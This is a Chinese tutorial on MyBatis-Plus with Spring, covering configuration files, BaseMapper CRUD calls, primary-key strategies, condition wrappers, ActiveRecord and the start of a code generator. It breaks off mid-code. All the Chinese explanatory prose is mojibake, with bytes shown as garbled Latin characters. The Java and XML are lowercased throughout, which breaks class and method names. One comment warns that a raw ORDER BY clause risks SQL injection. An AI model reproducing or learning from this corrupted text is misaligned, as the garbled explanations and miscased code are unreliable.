<artifactid>junit</artifactid>\n        <version>4.9</version>\n    </dependency>\n    \x3c!-- log4j --\x3e\n    <dependency>\n        <groupid>log4j</groupid>\n        <artifactid>log4j</artifactid>\n        <version>1.2.17</version>\n    </dependency>\n    \x3c!-- c3p0 --\x3e\n    <dependency>\n        <groupid>com.mchange</groupid>\n        <artifactid>c3p0</artifactid>\n        <version>0.9.5.2</version>\n    </dependency>\n    \x3c!-- mysql --\x3e\n    <dependency>\n        <groupid>mysql</groupid>\n        <artifactid>mysql-connector-java</artifactid>\n        <version>5.1.37</version>\n    </dependency>\n    \x3c!-- spring --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-context</artifactid>\n        <version>4.3.10.release</version>\n    </dependency>\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-orm</artifactid>\n        <version>4.3.10.release</version>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# springéç½®æä»¶éç½®\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n        xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n        xmlns:context="http://www.springframework.org/schema/context"\n        xmlns:tx="http://www.springframework.org/schema/tx"\n        xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd\n        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd">\n        \x3c!-- æ°æ®æº --\x3e\n    <context:property-placeholder location="classpath:db.properties"/>\n    <bean id="datasource" class="com.mchange.v2.c3p0.combopooleddatasource">\n        <property name="driverclass" value="${jdbc.driver}" />\n        <property name="jdbcurl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n        \x3c!-- äºå¡ç®¡çå¨ --\x3e\n    <bean id="datasourcetransactionmanager" class="org.springframework.jdbc.datasource.datasourcetransactionmanager">\n        <property name="datasource" ref="datasource" />\n    </bean>\n        \x3c!-- åºäºæ³¨è§£çäºå¡ç®¡ç --\x3e\n    <tx:annotation-driven transaction-manager="datasourcetransactionmanager"/>\n            \x3c!-- éç½® sqlsessionfactorybean --\x3e\n\x3c!--      <bean id="sqlsessionfactorybean" class="com.baomidou.mybatisplus.spring.mybatissqlsessionfactorybean">  --\x3e\n        \x3c!-- æ°æ®æº --\x3e\n\n        <bean id="sqlsessionfactorybean" class="org.mybatis.spring.sqlsessionfactorybean">\n        <property name="datasource" ref="datasource" />\n        <property name="configlocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- å«åå¤ç --\x3e\n        <property name="typealiasespackage" value="com.pwddd.mp.beans" />\n    </bean>\n        \x3c!--\n        éç½® mybatis æ«æ mapper æ¥å£çè·¯å¾\n        --\x3e\n    <bean class="org.mybatis.spring.mapper.mapperscannerconfigurer">\n        <property name="basepackage" value="com.pwddd.mp.mapper" />\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# log4jéç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype log4j:configuration system "log4j.dtd">\n<log4j:configuration xmlns:log4j="http://jakarta.apache.org/log4j/">\n    <appender name="stdout" class="org.apache.log4j.consoleappender">\n        <param name="encoding" value="utf-8" />\n        <layout class="org.apache.log4j.patternlayout">\n            <param name="conversionpattern" value="%-5p %d{mm-dd hh:mm:ss,sss} %m (%f:%l) \\n" />\n        </layout>\n    </appender>\n    <logger name="java.sql">\n        <level value="debug" />\n    </logger>\n    <logger name="org.apache.ibatis">\n        <level value="info" />\n    </logger>\n    <root>\n        <level value="debug" />\n        <appender-ref ref="stdout" />\n    </root>\n</log4j:configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# mybatiséç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# æ¿æ¢mybatisplus\n\nspringéç½®æä»¶ä¸­å°æä»¬æ·»å çsqlsessionfactorybeanæ¿æ¢ä¸ºmybatissqlsessionfactorybeanã\n\n<bean id="sqlsessionfactorybean" class="com.baomidou.mybatisplus.spring.mybatissqlsessionfactorybean">\n\n\n1\n\n\n\n# å¥é¨éç¨crud\n\n\n# insert\n\næåºé®é¢: åè®¾æä»¬å·²å­å¨ä¸å¼ tbl_employeeè¡¨ï¼ä¸å·²æå¯¹åºçå®ä½ç±»employeeï¼å®ç°tbl_employeeè¡¨çcrudæä½æä»¬éè¦åä»ä¹å¢ï¼\n\nå®ç°æ¹å¼:\n\nåºäºmybatisï¼éè¦ç¼åemployeemapperæ¥å£ï¼å¹¶æå¨ç¼åcrudæ¹æ³ æä¾employeemapper.xmlæ å°æä»¶ï¼å¹¶æå¨ç¼åæ¯ä¸ªæ¹æ³å¯¹åºçsqlè¯­å¥.\n\nåºäºmpï¼åªéè¦åå»ºemployeemapperæ¥å£, å¹¶ç»§æ¿basemapperæ¥å£.è¿å°±æ¯ä½¿ç¨mpéè¦å®æçæææä½ï¼çè³ä¸éè¦åå»ºsqlæ å°æä»¶ã\n\n 1. ç¼åæ¥å£éæbasemapper\n\npackage com.pwddd.mp.mapper;\n\nimport com.baomidou.mybatisplus.mapper.basemapper;\nimport com.pwddd.mp.bean.employee;\n\n// æ³å å¡«åå½åmapperæå¯¹åºçå®ä½ç±»\npublic interface employeemapper extends basemapper<employee> {\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. ç¼åæµè¯æ¹æ³\n\nprivate applicationcontext ac = new classpathxmlapplicationcontext("applicationcontext.xml");\nprivate employeemapper employeemapper = ac.getbean("employeemapper", employeemapper.class);\n\n@test\npublic void testenv() throws sqlexception {\n    employee employee = new employee();\n    employee.setlastname("zhangsan");\n    employee.setemail("zhangsan@qq.com");\n    employee.setgender(1);\n    employee.setage(24);\n    system.out.println(employeemapper.insert(employee));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nè¿è¡æ¶ä¼æå¼å¸¸ï¼ä¸»è¦åå æ¶idçç±»åä¸ºé®é¢ã\n\n could not set property \'id\' of \'class com.pwddd.mp.bean.employee\' with value \'1496379627045040130\' cause: java.lang.illegalargumentexception: argument type mismatch\n\n\n1\n\n\nåºç°å¼å¸¸çåå ï¼mybatisplusæä¾äºåç§ä¸»é®çç­ç¥ãæä»¬å¹¶æ²¡æè®¾ç½®ä¸»é®çç­ç¥ï¼å¯¹äºmybatisplusæ¥è¯´ï¼æå¦ä¸çå ç§ä¸»é®ç­ç¥:\n\nå¼               æè¿°\nauto            æ°æ®åº id èªå¢\nnone            æ ç¶æï¼è¯¥ç±»åä¸ºæªè®¾ç½®ä¸»é®ç±»åï¼æ³¨è§£éç­äºè·éå¨å±ï¼å¨å±éçº¦ç­äº inputï¼\ninput           insert åèªè¡ set ä¸»é®å¼\nassign_id       åé id(ä¸»é®ç±»åä¸º number(long å integer)æ string)(since\n                3.3.0),ä½¿ç¨æ¥å£identifiergeneratorçæ¹æ³nextid(é»è®¤å®ç°ç±»ä¸ºdefaultidentifiergeneratoréªè±ç®æ³)\nassign_uuid     åé uuid,ä¸»é®ç±»åä¸º string(since\n                3.3.0),ä½¿ç¨æ¥å£identifiergeneratorçæ¹æ³nextuuid(é»è®¤ default æ¹æ³)\nid_worker       åå¸å¼å¨å±å¯ä¸ id é¿æ´åç±»å(please use assign_id) å¼ç¨\nuuid            32 ä½ uuid å­ç¬¦ä¸²(please use assign_uuid) å¼ç¨\nid_worker_str   åå¸å¼å¨å±å¯ä¸ id å­ç¬¦ä¸²ç±»å(please use assign_id) å¼ç¨\n\nå¨å¼åè¿ç¨ä¸­ï¼ä½¿ç¨tableidè®¾ç½®ä¸»é®ç­ç¥ãå±æä¸¤ä¸ªå±æ§ï¼\n\n * value: å¦æè¡¨ä¸­æ°æ®çå¼åé¡¹ç®ä¸­beançå±æ§åä¸åï¼æèä¸éµè¡é©¼å³°å½åæ³ï¼åéè¦è¿è¡è®¾ç½®\n * type: è®¾ç½®ä¸»é®ç­ç¥idtypeçæä¸¾ï¼éè¦å¯¹åºè¡¨ä¸­çä¸»é®çç­ç¥ã\n\npublic class employee {\n\n    @tableid(value = "id",type = idtype.auto)\n    private integer id;\n\n\n1\n2\n3\n4\n\n\nä¿®æ¹ååæ¥éï¼\n\n### error updating database.  cause: com.mysql.jdbc.exceptions.jdbc4.mysqlsyntaxerrorexception: table \'mybatisplus.employee\' doesn\'t exist\n\n\n1\n\n\nåºç°è¿ä¸ªé®é¢çåå æ¯ï¼mybatisplusä¼æ ¹æ®å®ä½ç±»çç±»åå»æ°æ®åºä¸­æ¾ç¸å³çè¡¨åãå ä¸ºæä»¬æ°æ®åºä¸­çè¡¨åç§°åç±»åå¹¶ä¸å¯¹åºï¼å æ­¤ä¼æ¥éãmybatisplusä¹æä¾äºç¸å³çæ³¨è§£å»è®¾ç½®å¯»æ¾çåç§°ãtablename\n\n@tablename("tbl_employee")\npublic class employee {\n\n\n1\n2\n\n\nå¦ææ°æ®åºçç¸å³ååå®ä½ç±»ççåç§°ä¸å¯¹åºï¼(å¦last_nameålastname)ãmybaitsplusæ¯å¦ä½ä¿è¯æ°æ®è½å¤è½¬åã\n\nmpå¨å±ç­ç¥éç½®ä¸­æå¦ä¸çé»è®¤éç½®ï¼è¯¥éç½®ç±»ä¼¼äºmybatisçé©¼å³°å½åæ³çè½¬åï¼å¹¶ä¸é»è®¤å¼å¯ã\n\n<bean id="globalconfiguration" class="com.baomidou.mybatisplus.entity.globalconfiguration">\n    <property name="dbcolumnunderline" value="true" />\n</bean>\n\n\n1\n2\n3\n\n\nå¦ææä»¬å°è¯¥å­æ®µä¿®æ¹ä¸ºfalseï¼é£ä¹mpå¹¶ä¸ä¼èªå¨å°é©¼å³°å½åè¿è¡å¹éãæä»¬è¿å¯ä»¥éè¿@tablefiledæ³¨è§£ï¼ç¨valueæå®å¯¹åºçæ°æ®åºååç§°ãexistè¡¨ç¤ºå¨æ°æ®åºä¸­ææ²¡æå¯¹åºçå­æ®µå­å¨ï¼é»è®¤æ¯å¨æ°æ®åºä¸­æå¯¹åºçå­æ®µãå¦æå¯¹åºçjavabeanå¨è¡¨ä¸­æ²¡æç¸å³çæ å°ï¼é£ä¹å¨è¿è¡æ°æ®åºæä½æ¶å°±ä¼æ¥éï¼æä»¬å°è¯¥å­æ®µçexistè®¾ç½®æfalseï¼å°±å¯ä»¥å¿½ç¥è¿ä¸ªå­æ®µã\n\n@tablefield(value = "last_name")\nprivate string lastname;\n\n@tablefield(exist = false)\nprivate double salary;\n\n\n1\n2\n3\n4\n5\n\n\né£ä¹å¯¹äºæä»¬çä¸»é®ç­ç¥ï¼åå¯¹åºçè¡¨åç§°çæ å°ï¼å¦ææ¯ä¸ªå®ä½ç±»é½éè¦è¿è¡éç½®ï¼åè¿äºéº»ç¦ï¼mpæä¾äºå¨å±éç½®çæ¹å¼ã\n\n<bean id="globalconfiguration" class="com.baomidou.mybatisplus.entity.globalconfiguration">\n    <property name="dbcolumnunderline" value="true" />\n    \x3c!--å¨å±éç½® --\x3e\n    <property name="idtype" value="0" />\n</bean>\n\n\n1\n2\n3\n4\n5\n\n\næä»¬éç½®äºidtypeä¸º0ä¹åï¼ä¼è°ç¨æä¸¾ç±»çgetidtypeæ¹æ³ï¼è¯¥æ¹æ³æ ¹æ®æä»¬ä¼ å¥çidtypeçkeyå»æ¾å¯¹åºçä¸»é®ç­ç¥ç±»å\n\n\n\næä»¬å ä¸å¨å±çéç½®ä¹åï¼è¿éè¦å°éç½®æ³¨å¥å°sqlsessionä¸­ï¼å¦åä¸ä¼èµ·ä½ç¨ã\n\n    <bean id="sqlsessionfactorybean" class="com.baomidou.mybatisplus.spring.mybatissqlsessionfactorybean">\n        <property name="datasource" ref="datasource" />\n        <property name="configlocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- å«åå¤ç --\x3e\n        <property name="typealiasespackage" value="com.pwddd.mp.beans" />\n        <property name="globalconfig" ref="globalconfiguration" />\n    </bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@tablenameæ³¨è§£ä¼æå®å®ä½ç±»å¯¹åºçè¡¨åç§°ï¼æä»¬å¨åå»ºæ°æ®åºè¡¨çæ¶åéå¸¸ä¼ç»è¡¨å ä¸ä¸äºåºå®çè¡¨åç¼ï¼è¿ä¼å¯¼è´æä»¬çå®ä½ç±»åè¡¨åç§°ä¸å¯¹åºãå æ­¤å¨mpä¸­ä¹æä¾äºæ·»å è¡¨åç¼çå¨å±éç½®ã\n\n<property name="tableprefix" value="tbl_" />\n\n\n1\n\n\nå¨mybatiséé¢ï¼å¨æå¥æä½åå¦æéè¦è·åmybatisæå¥ä¹åæ°æ®çä¸»é®å¼ï¼éè¦å¨mapperæ å°æä»¶ä¸­çselectæ ç­¾éé¢è®¾ç½®ä¸¤ä¸ªæ ç­¾å¼ï¼ä¸ä¸ªæ¯ä¸»é®çèªå¢ï¼ä¸ä¸ªæ¯æä»¬è¿åå°æå¥å®ä½çjavabeançå¯¹åºå±æ§ã\n\nusegeneratedkeys="true" keyproperty="userid"\n\n\n1\n\n\n**èå¨mybatisplusä¸­ä¼èªå¨å°æå¥æ°æ®çä¸»é®å¼èªå¨æ³¨å¥å°æä»¬çæå¥å®ä½ä¸­ã**ä¸éè¦æä»¬è¿è¡ä»»ä½æä½ã\n\ninsertæ¹æ³å¨è¿è¡æå¥æä½æ¶ï¼ä¼èªå¨çå¤æ­æå¥å­æ®µå¯¹åºçå¼æ¯å¦ä¸ºnullï¼å¦æä¸ºnullåå¨æå¥æä½ä¸­å°±ä¸æå¥è¯¥å¼äºãå¦ææä»¬éè¦å¨å­æ®µçæå¥å¼ï¼æä»¬éè¦ä½¿ç¨insertallcolumnæ¹æ³ã\n\ndebug 02-23 15:36:22,520 ==>  preparing: insert into tbl_employee ( last_name,email,gender,age ) values ( ?,?,?,? )  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\n\n# update\n\nmpä¸ºæä»¬æä¾äºéç¨çupdateæ¹æ³ï¼updatebyidï¼åä¸é¢çinsertä¸æ ·ï¼å¦æä¸ä¼ å¥å¯¹åºçåæ°ï¼åmpä¸ä¼å¯¹è¯¥åæ°å¯¹åºçæ°æ®åºåå¼è¿è¡ä¿®æ¹ãåæ¶mpè¿æä¾äºç±»ä¼¼insertallcolumnsçæ¹æ³updateallcolumnsbyidã\n\n@test\npublic void testupdate(){\n    employee employee = new employee();\n    employee.setid(1);\n    employee.setage(11);\n    employee.setgender(1);\n    //        employee.setemail("helo@qq.com");\n    //        employee.setlastname("haha");\n    //        employeemapper.updatebyid(employee);\n    employeemapper.updateallcolumnbyid(employee);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# select\n\nmpæä¾äºå¤ä¸ªæ¥è¯¢æ¹æ³ï¼\n\n * selectbyid\n * selecgtone\n * selectbatchsids\n * selectbymap\n * selectpage\n\n# selectbyid\n\n@test\npublic void testselect(){\n    employee employee = employeemapper.selectbyid(1);\n    system.out.println(employee);\n}\n\n//employee{id=1, lastname=\'null\', email=\'null\', gender=1, age=11}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# selectone\n\nå¦ææä»¬éè¦å¶ä»çåè¿è¡æ¥è¯¢ï¼åä¸è½ä½¿ç¨selectbyidè¿è¡æ¥è¯¢äºãæä»¬éè¦ç¨å®ä½ç±»å°è£æä»¬éè¦æ¥è¯¢çæ¡ä»¶ï¼ç¶åä½¿ç¨selectoneè¿è¡æ¥è¯¢ãmpä¼å°æä»¬å°è£çéç©ºçå±æ§åå½æ¥è¯¢çæ¡ä»¶ã\n\n@test\npublic void testselect(){\n    //        employee employee = employeemapper.selectbyid(1);\n    //        system.out.println(employee);\n    employee employee = new employee();\n    employee.setage(25);\n    employee.setgender(0);\n    employee employee1 = employeemapper.selectone(employee);\n    system.out.println(employee1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\ndebug 02-23 15:53:07,967 ==>  preparing: select id,last_name as lastname,email,gender,age from tbl_employee where gender=? and age=?  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\nå¦æå­å¨å¹éçå¤æ¡æ°æ®ï¼åæ¥è¯¢å°ä¼æ¥éã\n\n# selectbatchsids\n\néè¿å¤ä¸ªidè¿è¡æ¹éçæ¥è¯¢ã\n\nlist<integer> list = new arraylist<>();\nlist.add(1);\nlist.add(2);\nlist.add(6);\nsystem.out.println(employeemapper.selectbatchids(list));\n\n\n1\n2\n3\n4\n5\n\n\næ¥è¯¢è¯­å¥:\n\ndebug 02-23 15:55:50,296 ==>  preparing: select id,last_name as lastname,email,gender,age from tbl_employee where id in ( ? , ? , ? )  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\n# selectbymap\n\néè¿mapå°è£æä»¬çæ¥è¯¢æ¡ä»¶ï¼è·å¾æ¹éçç»æã\n\nhashmap<string, object> map = new hashmap<>();\n// æ³¨æï¼ mapçkeyæ¯æ°æ®åºä¸­å¯¹åºçåå\nmap.put("last_name","zhangsan");\nmap.put("gender",1);\nsystem.out.println(employeemapper.selectbymap(map));\n\n\n1\n2\n3\n4\n5\n\n\néè¦æ³¨æçæ¯ï¼selectbymapæ¥åçåæ°æ¯ä¸ä¸ªcolumnmapï¼ä¹å°±æ¯è¯´ï¼æä»¬å¨å°è£æ¥è¯¢æ¡ä»¶æ¶ï¼éè¦ä¼ å¥çmapçkeyå¯¹åºçæ¯æ°æ®åºä¸­çååç§°ï¼èä¸æ¯æä»¬javabeançå±æ§åã\n\n# selectpage\n\nselectpageæ¯mpå¸®å©æä»¬æ¹ä¾¿çè¿è¡åé¡µæ¥è¯¢çæ¹æ³ãè¯¥æ¹æ³æä¸¤ä¸ªåæ°ï¼ä¸ä¸ªæ¯rowbounds,è¿æwapperæ¡ä»¶æ¥è¯¢å¨ãå¶ä¸­rowboundsæä»¬å¯ä»¥ä½¿ç¨è¯¥ç±»çå­ç±»page\n\nlist<t> selectpage(rowbounds var1, @param("ew") wrapper<t> var2);\n\n\n1\n\n\nä½¿ç¨æ¹æ³ï¼\n\nsystem.out.println(employeemapper.selectpage(new page<>(2, 2), null));\n\n\n1\n\n\næ¥è¯¢è¯­å¥:\n\ndebug 02-23 16:05:17,595 ==>  preparing: select id,last_name as lastname,email,gender,age from tbl_employee  (jakartacommonsloggingimpl.java:54) \n\n\n1\n\n\næä»¬åç°ï¼mpä¸æ¯ä½¿ç¨limitå³é®å­è¿è¡åé¡µçï¼mpåºå±è¿æ¯å©ç¨rowboundsè¿è¡å®ç°çãè¯¥åé¡µæ¯ä½¿ç¨äºåå­åé¡µçææ¯å®ç°çï¼å¦æè¦ä½¿ç¨ç©çåé¡µï¼éè¦ä½¿ç¨ç¸å³çåé¡µæä»¶ã\n\n\n# delete\n\nmpæä¾çéç¨å é¤æ¹æ³æå¦ä¸å ç§ï¼\n\n * deletebyid\n * deletebymap\n * deletebybatchids\n\nä½¿ç¨æ¹æ³ï¼\n\n//1. æ ¹æ®idè¿è¡å é¤æä½\nsystem.out.println(employeemapper.deletebyid(11));\n//2. æ ¹æ®mapå°è£å é¤æ¡ä»¶\nhashmap<string, object> map = new hashmap<>();\nmap.put("last_name","zhangsan");\nmap.put("id",10);\nsystem.out.println(employeemapper.deletebymap(map));\n\n//3. æ¹éå é¤æä½\narraylist<integer> list = new arraylist<>();\nlist.add(1);\nlist.add(2);\nlist.add(3);\nsystem.out.println(employeemapper.deletebatchids(list));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# mpå¯å¨æ³¨å¥sqlçåç\n\né®é¢ï¼xxxmapperç»§æ¿äºbasemapperï¼basemapperä¸­æä¾äºç¸å³çcrudæ¹æ³ï¼é£ä¹å¿é¡»è¿æsqlè¯­å¥ï¼æç»è¿æ¯éè¿mybatisè¿è¡æä½æ°æ®ã\n\n 1. xxxmapperçæ¬è´¨æ¯ä¸ä¸ªä»£çç±»çå¯¹è±¡ã\n 2. å¨mapperproxyä¸­æä¸ä¸ªsqlsessionï¼sqlsessionæä»¬è½æ¾å°å·ä½çsqlsessionfactory\n 3. å¨sqlsessionfactoryä¸­æä¸ä¸ªconfigurationå¯¹è±¡ï¼è¯¥å¯¹è±¡ä¸­ä¼æmapstatedmentå¯¹è±¡ï¼è¯¥å¯¹è±¡å°è£äºæä»¬å·ä½çæ¥è¯¢è¯­å¥ã\n 4. å¨mpä¸­æä¸ä¸ªsqlèªå¨æ³¨å¥ç±»ï¼autosqlinjectorï¼è¯¥ç±»è´è´£æ³¨å¥sqlè¯­å¥ã\n\n\n# æ¡ä»¶æé å¨\n\nç°æä¸ä¸ªéæ±ï¼æä»¬éè¦åé¡µæ¥è¯¢tbl_employeeè¡¨ä¸­ï¼å¹´é¾å¨18~50ä¹é´ãæ§å«ä¸ºç·ãä¸å§åä¸º xx çææç¨æ·ï¼è¿æ¶åæä»¬è¯¥å¦ä½å®ç°ä¸è¿°éæ±å¢ï¼\n\nmybatis : éè¦å¨sqlæ å°æä»¶ä¸­ç¼åå¸¦æ¡ä»¶æ¥è¯¢çsql,å¹¶åºäºpagehelperæä»¶å®æåé¡µ.\n\nå®ç°ä»¥ä¸ä¸ä¸ªç®åçéæ±ï¼å¾å¾éè¦æä»¬åå¾å¤éå¤åè°çå·¥ä½ãæ®éçmapperè½å¤è§£å³è¿ç±»çç¹åï¼\n\nmp: ä¾æ§ä¸ç¨ç¼åsqlè¯­å¥, mpæä¾äºåè½å¼ºå¤§çæ¡ä»¶æé å¨entitywrapperã\n\næ¡ä»¶æé å¨ç±»ä¼¼äºmybatiséé¢éåå·¥ç¨ä¸­çæçxxxexampleï¼æä»¬å¯ä»¥ä½¿ç¨criteriaè¿è¡æ¥è¯¢ï¼è¿ç§æ¥è¯¢é£æ ¼ç§°ä¹ä¸ºqbc(query by criteria)ï¼å¨mpä¸­ç§°ä¸ºæ¡ä»¶æé å¨ãmpä¸­æä¸¤ç§æ¹å¼ä½¿ç¨æ¡ä»¶æé å¨ï¼åå«æ¯entitywrapperåconditionãä¸¤ç§æ¹å¼ä½¿ç¨åºæ¬ç±»ä¼¼ã\n\nä½¿ç¨æ¡ä»¶æé å¨å®æå¢å æ¹æ¥ï¼\n\n    @test\n    public void qbc(){\n        // ä½¿ç¨ewè¿è¡åé¡µæ¥è¯¢\n        system.out.println(employeemapper.selectpage(new rowbounds(1, 3),\n                new entitywrapper<employee>()\n                        .eq("last_name", "zhangsan")\n                        .ornew() // ornewä¼å°åé¢ææçæ¡ä»¶ä½ä¸ºä¸ä¸ªæ´ä½\n                        //                        .or() // orä¼ååé¢çæ¡ä»¶å¹¶å\n                        .eq("gender", 0)\n        ));\n\n        // ä½¿ç¨ewæ¥è¯¢åè¡¨\n        system.out.println(employeemapper.selectlist(new entitywrapper<employee>()\n                .eq("last_name", "zhangsan")\n                .between("age", 10, 20)\n        ));\n\n        // ä½¿ç¨ewæ¡ä»¶æ´æ°\n        employee employee = new employee();\n        employee.setlastname("lisi");\n        employee.setgender(0);\n        employeemapper.update(employee,new entitywrapper<employee>()\n                .eq("id",8)\n        );\n\n        //ä½¿ç¨conditionè¿è¡æ¡ä»¶å é¤\n        employeemapper.delete(\n                condition.create()\n                        .eq("id",8)\n        );\n\n        // last orderbyæ¥è¯¢\n        system.out.println(employeemapper.selectlist(new entitywrapper<employee>()\n//                .orderdesc(arrays.aslist("age"))\n//                .orderasc(arrays.aslist("age"))\n//                        .orderby("age")\n                        .last("order by age desc")  // å®¹æé æsqlæ³¨å¥\n        ));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# æ´»å¨è®°å½ - activerecord\n\nactive record(æ´»å¨è®°å½)ï¼æ¯ä¸ç§é¢åæ¨¡åæ¨¡å¼ï¼ç¹ç¹æ¯ä¸ä¸ªæ¨¡åç±»å¯¹åºå³ç³»åæ°æ®åºä¸­çä¸ä¸ªè¡¨ï¼èæ¨¡åç±»çä¸ä¸ªå®ä¾å¯¹åºè¡¨ä¸­çä¸è¡è®°å½ã\n\nå¼å¯arï¼éè¦è®©è¢«æ¥è¯¢çå®ä½ç±»ç»§æ¿modelç±»ï¼å¹¶ä¸å®ç°ç¸åºçæ¹æ³ãæ¹æ³è¿åä¸»é®ã\n\npublic class employee extends model<employee> {\n    @override\n    protected serializable pkval() {\n        return id;\n    }\n\n\n1\n2\n3\n4\n5\n\n\nåºç¡æä½ï¼\n\n1) æå¥æä½\npublic boolean insert()\n2) ä¿®æ¹æä½\npublic boolean updatebyid()\n3) æ¥è¯¢æä½\npublic t selectbyid()\npublic t selectbyid(serializable id)\npublic list&lt;t> selectall()\npublic list&lt;t> selectlist(wrapper wrapper)\npublic int selectcount(wrapper wrapper)\n4) å é¤æä½\npublic boolean deletebyid()\npublic boolean deletebyid(serializable id)\npublic boolean delete(wrapper wrapper)\n5) åé¡µå¤ææä½\npublic page&lt;t> selectpage(page&lt;t> page, wrapper&lt;t> wrapper)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n@test\npublic void testar(){\n    // æå¥æä½\n    employee employee = new employee();\n    employee.setlastname("lisi");\n    employee.setage(23);\n    employee.setemail("zhangsan@qq.com");\n    employee.setgender(1);\n    employee.insert();\n    //ä¿®æ¹æä½\n    employee.setid(7);\n    employee.updatebyid();\n    // æ¥è¯¢æä½\n    system.out.println(employee.selectbyid());\n    system.out.println(employee.selectbyid(6));\n    system.out.println(employee.selectall());\n    system.out.println(employee.selectlist(new entitywrapper().eq("last_name", "zhangsan")));\n    system.out.println(employee.selectcount(new entitywrapper().eq("last_name", "zhangsan")));\n    //å é¤æä½\n    employee.deletebyid();\n    employee.deletebyid(1);\n    employee.delete(new entitywrapper().eq("id",20));\n\n    system.out.println(employee.selectpage(new page<>(1, 2),\n                                           new entitywrapper<employee>().like("last_name", "%a%")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# ä»£ç çæå¨\n\nmpæä¾äºå¤§éçèªå®ä¹è®¾ç½®ï¼çæçä»£ç å®å¨è½å¤æ»¡è¶³åç±»åçéæ±\n\nmpçä»£ç çæå¨åmybatismbgä»£ç çæå¨:\n\nmp çä»£ç çæå¨é½æ¯åºäº java ä»£ç æ¥çæã\n\nmbg åºäº xml æä»¶è¿è¡ä»£ç çæã\n\nmybatisçä»£ç çæå¨å¯çæ: å®ä½ç±»ãmapperæ¥å£ãmapperæ å°æä»¶\n\nmpçä»£ç çæå¨å¯çæ: å®ä½ç±»(å¯ä»¥éæ©æ¯å¦æ¯æ ar)ãmapperæ¥å£ãmapperæ å°æä»¶ã serviceå±ãcontrollerå±ã\n\næ·»å ä¾èµ\n\nç±äºmpä½¿ç¨çæ¯åºäºapacheçvelocityæ¨¡æ¿ææ¯ï¼å æ­¤éè¦å¼å¥ç¸å³çä¾èµåï¼åæ¶ä¹å¯ä»¥æ¿æ¢ä¸ºå¶ä»çæ¨¡æ¿ãå¹¶ä¸éè¦æ·»å æ¥å¿ç¸å³çä¾èµã\n\n<dependency>\n <groupid>org.apache.velocity</groupid>\n <artifactid>velocity-engine-core</artifactid>\n <version>2.0</version>\n</dependency>\n\n<dependency>\n<groupid>org.slf4j</groupid>\n<artifactid>slf4j-api</artifactid>\n<version>1.7.7</version>\n</dependency>\n<dependency>\n<groupid>org.slf4j</groupid>\n<artifactid>slf4j-log4j12</artifactid>\n<version>1.7.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nçæä»£ç \n\n@test\npublic void testgenerator() {\n    /*å¨å±éç½®*/\n    globalconfig config = new globalconfig();\n    config.setactiverecord(true) /*æ¯å¦æ¯æaræ¨¡å¼*/\n        .setauthor("jm") /*ä½è*/\n        .setoutputdir("e:\\\\workspace\\\\code\\\\java\\\\study\\\\mybatisplus\\\\src\\\\main\\\\java")\n        /*çæè·¯å¾*/\n        .setfileoverride(true)/*æä»¶è¦ç*/\n        .setservicename("%sservice") /*è®¾ç½®çæçserviceæ¥å£å  é¦å­æ¯æ¯å¦ä¸ºi*/\n        .setidtype(idtype.auto) /*ä¸»é®ç­ç¥*/\n        ;\n\n    /*æ°æ®æºéç½®*/\n    datasourceconfig dsconfig = new datasourceconfig();\n    dsconfig.setdbtype(dbtype.mysql)\n        .seturl("jdbc:mysql://localhost:3306/mybatisplus")\n        .setdrivername("com.mysql.jdbc.driver")\n        